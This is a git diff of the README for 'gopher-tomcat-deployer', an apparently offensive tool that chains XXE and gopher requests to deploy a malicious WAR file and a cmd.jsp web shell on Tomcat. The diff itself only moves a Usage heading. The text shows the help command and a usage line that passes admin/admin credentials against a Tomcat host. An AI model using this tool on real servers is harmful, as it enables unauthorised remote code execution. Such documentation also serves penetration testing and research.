@@ -4,9 +4,11 @@
 
 [![Video](http://img.youtube.com/vi/PQDZlYN0cAk/0.jpg)](http://www.youtube.com/watch?v=PQDZlYN0cAk "XXE to RCE with gopher")
 
-$ python gopher-tomcat-deployer.py -h
+
+## Usage
 
 ```
+$ python gopher-tomcat-deployer.py -h
 =============================================================================
 |                        GOPHER TOMCAT DEPLOYER v0.1                        |
 |                              by pimps and alec                            |
@@ -34,8 +36,6 @@ sure that the generated malicious war file will properly work when deployed.
 This script was tested against Tomcat 6.
 
 ```
-
-## Usage
 
 ```
 $ python gopher-tomcat-deployer.py -u admin -p admin -t 127.0.0.1 -pt 8080 cmd.jsp
